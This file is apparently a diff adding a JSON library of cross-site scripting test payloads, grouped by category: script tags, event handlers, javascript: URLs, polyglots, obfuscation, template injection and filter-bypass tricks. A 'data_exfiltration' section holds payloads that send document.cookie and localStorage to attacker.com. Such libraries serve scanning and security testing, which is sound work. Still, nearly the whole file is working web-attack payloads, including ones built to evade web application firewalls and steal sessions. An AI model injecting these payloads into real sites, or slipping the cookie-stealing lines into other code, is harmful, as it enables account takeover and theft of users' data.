@@ -1,0 +1,295 @@
+{
+  "description": "Cross-Site Scripting (XSS) Test Payloads Library",
+  "version": "1.0.0",
+  "categories": {
+    "basic": {
+      "description": "Basic script injection payloads",
+      "payloads": [
+        {
+          "name": "Basic Alert",
+          "payload": "<script>alert('XSS')</script>",
+          "severity": "medium",
+          "context": ["html", "attribute"]
+        },
+        {
+          "name": "CharCode Alert",
+          "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+          "severity": "medium",
+          "context": ["html"]
+        },
+        {
+          "name": "Image Error",
+          "payload": "<img src=x onerror=alert('XSS')>",
+          "severity": "high",
+          "context": ["html", "attribute"]
+        },
+        {
+          "name": "Body Onload",
+          "payload": "<body onload=alert('XSS')>",
+          "severity": "medium",
+          "context": ["html"]
+        }
+      ]
+    },
+    "encoded": {
+      "description": "Encoded XSS payloads",
+      "payloads": [
+        {
+          "name": "HTML Entity Encoded",
+          "payload": "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
+          "severity": "medium",
+          "context": ["html"]
+        },
+        {
+          "name": "URL Encoded",
+          "payload": "%3Cscript%3Ealert('XSS')%3C/script%3E",
+          "severity": "medium",
+          "context": ["url", "query"]
+        },
+        {
+          "name": "Unicode Escaped",
+          "payload": "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
+          "severity": "medium",
+          "context": ["javascript"]
+        }
+      ]
+    },
+    "event_handlers": {
+      "description": "Event handler based XSS",
+      "payloads": [
+        {
+          "name": "SVG Onload",
+          "payload": "<svg onload=alert('XSS')>",
+          "severity": "high",
+          "context": ["html"]
+        },
+        {
+          "name": "Input Focus",
+          "payload": "<input onfocus=alert('XSS') autofocus>",
+          "severity": "high",
+          "context": ["html"]
+        },
+        {
+          "name": "Video Error",
+          "payload": "<video><source onerror=alert('XSS')>",
+          "severity": "high",
+          "context": ["html"]
+        },
+        {
+          "name": "Audio Error",
+          "payload": "<audio src=x onerror=alert('XSS')>",
+          "severity": "high",
+          "context": ["html"]
+        },
+        {
+          "name": "Details Toggle",
+          "payload": "<details open ontoggle=alert('XSS')>",
+          "severity": "medium",
+          "context": ["html"]
+        },
+        {
+          "name": "Marquee Start",
+          "payload": "<marquee onstart=alert('XSS')>",
+          "severity": "low",
+          "context": ["html"]
+        }
+      ]
+    },
+    "javascript_protocols": {
+      "description": "JavaScript protocol payloads",
+      "payloads": [
+        {
+          "name": "JavaScript Protocol",
+          "payload": "javascript:alert('XSS')",
+          "severity": "high",
+          "context": ["href", "src", "action"]
+        },
+        {
+          "name": "JavaScript Newline",
+          "payload": "javascript://%0Aalert('XSS')",
+          "severity": "high",
+          "context": ["href", "src"]
+        },
+        {
+          "name": "Mixed Case Protocol",
+          "payload": "JaVaScRiPt:alert('XSS')",
+          "severity": "medium",
+          "context": ["href", "src"]
+        }
+      ]
+    },
+    "dom_based": {
+      "description": "DOM-based XSS payloads",
+      "payloads": [
+        {
+          "name": "DOM Object",
+          "payload": "<object data='javascript:alert(1)'>",
+          "severity": "high",
+          "context": ["html"]
+        },
+        {
+          "name": "Embed Source",
+          "payload": "<embed src='javascript:alert(1)'>",
+          "severity": "high",
+          "context": ["html"]
+        },
+        {
+          "name": "Iframe Source",
+          "payload": "<iframe src='javascript:alert(1)'>",
+          "severity": "high",
+          "context": ["html"]
+        },
+        {
+          "name": "Mouseover Event",
+          "payload": "<div id='x' onmouseover='alert(1)' style='width:100px;height:100px'>Hover me</div>",
+          "severity": "high",
+          "context": ["html"]
+        }
+      ]
+    },
+    "polyglot": {
+      "description": "Polyglot XSS payloads",
+      "payloads": [
+        {
+          "name": "Script Tag Polyglot",
+          "payload": "'--></script><script>alert('XSS')</script>",
+          "severity": "high",
+          "context": ["attribute", "javascript"]
+        },
+        {
+          "name": "Quote Semicolon",
+          "payload": "';alert('XSS');//",
+          "severity": "high",
+          "context": ["attribute", "javascript"]
+        },
+        {
+          "name": "Complex Polyglot",
+          "payload": "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">\'<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
+          "severity": "critical",
+          "context": ["attribute", "javascript", "html"]
+        }
+      ]
+    },
+    "obfuscated": {
+      "description": "Obfuscated XSS payloads",
+      "payloads": [
+        {
+          "name": "Broken Script Tags",
+          "payload": "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+          "severity": "medium",
+          "context": ["html"]
+        },
+        {
+          "name": "Base64 Eval",
+          "payload": "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
+          "severity": "medium",
+          "context": ["html"]
+        },
+        {
+          "name": "SetTimeout",
+          "payload": "<script>setTimeout('alert(1)',0)</script>",
+          "severity": "medium",
+          "context": ["html"]
+        }
+      ]
+    },
+    "template_injection": {
+      "description": "Template injection payloads",
+      "payloads": [
+        {
+          "name": "Angular Constructor",
+          "payload": "{{constructor.constructor('alert(1)')()}}",
+          "severity": "high",
+          "context": ["template"]
+        },
+        {
+          "name": "Template Literal",
+          "payload": "${alert('XSS')}",
+          "severity": "high",
+          "context": ["template"]
+        },
+        {
+          "name": "EJS Template",
+          "payload": "<%=alert('XSS')%>",
+          "severity": "high",
+          "context": ["template"]
+        },
+        {
+          "name": "Ruby Template",
+          "payload": "#{alert('XSS')}",
+          "severity": "high",
+          "context": ["template"]
+        }
+      ]
+    },
+    "data_exfiltration": {
+      "description": "Data exfiltration payloads",
+      "payloads": [
+        {
+          "name": "Fetch Cookie",
+          "payload": "<script>fetch('https://attacker.com/log?data='+document.cookie)</script>",
+          "severity": "critical",
+          "context": ["html"]
+        },
+        {
+          "name": "Image Cookie",
+          "payload": "<img src=x onerror=this.src='https://attacker.com/log?c='+document.cookie>",
+          "severity": "critical",
+          "context": ["html"]
+        },
+        {
+          "name": "LocalStorage Theft",
+          "payload": "<script>fetch('https://attacker.com/log?ls='+JSON.stringify(localStorage))</script>",
+          "severity": "critical",
+          "context": ["html"]
+        }
+      ]
+    },
+    "waf_bypass": {
+      "description": "WAF bypass payloads",
+      "payloads": [
+        {
+          "name": "Null Byte",
+          "payload": "<s%00cript>alert('XSS')</s%00cript>",
+          "severity": "medium",
+          "context": ["html"]
+        },
+        {
+          "name": "Extra Spaces",
+          "payload": "<script >alert('XSS')</script >",
+          "severity": "medium",
+          "context": ["html"]
+        },
+        {
+          "name": "Comment Injection",
+          "payload": "<script/**/>alert('XSS')</script/**/>",
+          "severity": "medium",
+          "context": ["html"]
+        },
+        {
+          "name": "Tab Character",
+          "payload": "<scr%09ipt>alert('XSS')</scr%09ipt>",
+          "severity": "medium",
+          "context": ["html"]
+        }
+      ]
+    }
+  },
+  "contexts": {
+    "html": "Payloads for HTML body context",
+    "attribute": "Payloads for HTML attribute context",
+    "javascript": "Payloads for JavaScript context",
+    "url": "Payloads for URL context",
+    "query": "Payloads for query parameter context",
+    "template": "Payloads for template injection",
+    "href": "Payloads for href attributes",
+    "src": "Payloads for src attributes",
+    "action": "Payloads for form action attributes"
+  },
+  "severity_levels": {
+    "low": "Low impact, requires user interaction",
+    "medium": "Moderate impact, some user interaction",
+    "high": "High impact, minimal user interaction",
+    "critical": "Critical impact, no user interaction"
+  }
+}
